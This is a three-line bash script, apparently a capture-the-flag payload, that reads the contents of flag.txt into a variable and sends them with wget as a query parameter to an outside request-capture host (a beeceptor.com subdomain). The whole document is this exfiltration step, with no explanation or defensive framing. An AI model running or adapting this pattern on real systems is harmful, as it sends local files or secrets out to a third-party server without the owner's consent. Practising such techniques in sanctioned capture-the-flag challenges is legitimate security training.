#!/bin/bash
OUTPUT=$(cat flag.txt)
wget "https://ctf23.free.beeceptor.com?output=${OUTPUT}"